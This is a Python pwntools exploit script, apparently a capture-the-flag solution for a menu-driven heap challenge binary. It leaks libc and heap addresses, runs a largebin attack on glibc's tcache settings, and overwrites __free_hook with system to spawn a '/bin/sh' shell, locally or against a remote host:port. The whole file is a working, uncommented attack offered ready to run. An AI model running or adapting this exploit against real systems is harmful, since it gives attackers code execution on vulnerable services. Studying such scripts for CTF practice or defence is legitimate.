from pwn import *
context(os='linux', arch='i386', kernel='amd64')

fname = args.FNAME if args.FNAME else './vuln'
libname = args.LIB if args.LIB else '/lib/x86_64-linux-gnu/libc.so.6'
ldname = args.LD if args.LD else '/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'

exe = ELF(fname)
libc = ELF(libname)
ldso = ELF(ldname)
context.binary = exe

if args.REMOTE:
    host, port = args.REMOTE.split(':')
    io = remote(host, int(port))
else:
    io = process([ldname, fname], env={'LD_PRELOAD':libname})

def bpt():
    if not args.REMOTE:
        gdb.attach(io)
    pause()

s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil

def opt(idx):
    sla(b'>', str(idx).encode())

def create(i, sz):
    opt(1)
    sla(b'Index: ', str(i).encode())
    sla(b'Size: ', str(sz).encode())

def edit(i, content):
    opt(3)
    sla(b'Index: ', str(i).encode())
    sa(b'Content: ', content)

def show(i):
    opt(4)
    sla(b'Index: ', str(i).encode())

def delete(i):
    opt(2)
    sla(b'Index: ', str(i).encode())

def exp():
    off_mp = 0x1eb280 if args.REMOTE else 0x1ec280
    off_mp += 0x1000
    off_arena =  0x1ebb80 if args.REMOTE else 0x1ecb80
    off_arena += 0x1000
    
    create(0, 0x500)
    create(1, 0x500)
    create(2, 0x510)
    create(3, 0x500)

    # leak libc address 
    delete(2)
    show(2)
    data = ru(b'\n1.', drop=True)
    libc.address = u64(data.ljust(8, b'\x00')) - off_arena - 96
    log.success(f'libc@0x{libc.address:x}')

    create(4, 0x600) # put chk2 to largebin
    create(2, 0x510) # realloc chk2 to leak fd, fd_nextsize
    show(2)
    data = ru(b'\n1.', drop=True)
    fd = u64(data.ljust(8, b'\x00'))
    log.success(f'fd=0x{fd:x}')

    edit(2, b'a'*0x10)
    show(2)
    ru(b'a'*0x10)
    data = ru(b'\n1.', drop=True)
    fd_nxtsz = u64(data.ljust(8, b'\x00'))
    heap_base =fd_nxtsz & (~0xfff)
    log.success(f'fd_nextsize=0x{fd_nxtsz:x}\nheap@0x{heap_base:x}')

    delete(2)
    create(4, 0x600) # re-put chk2 into largebin

    mp_tc_bins = libc.address + off_mp + 0x50 # address to mp_.tcache_bins
    edit(2, flat([fd, fd, fd_nxtsz, p64(mp_tc_bins-0x20)]))
    delete(0)
    create(4, 0x600) # largebin attack to overwrite mp_.tcache_bins

    delete(1) # chk1 should be put into tcache.entries[0x4f]
    edit(0, b'/bin/sh'.ljust((0xf-2)*8, b'\0') + p64(libc.sym.__free_hook))

    create(1, 0x500) # malloc to __free_hook
    edit(1, p64(libc.sym.system))
    delete(0)


if '__main__' == __name__:
    if args.DEBUG:
        context.log_level='debug'
    exp()
    io.interactive()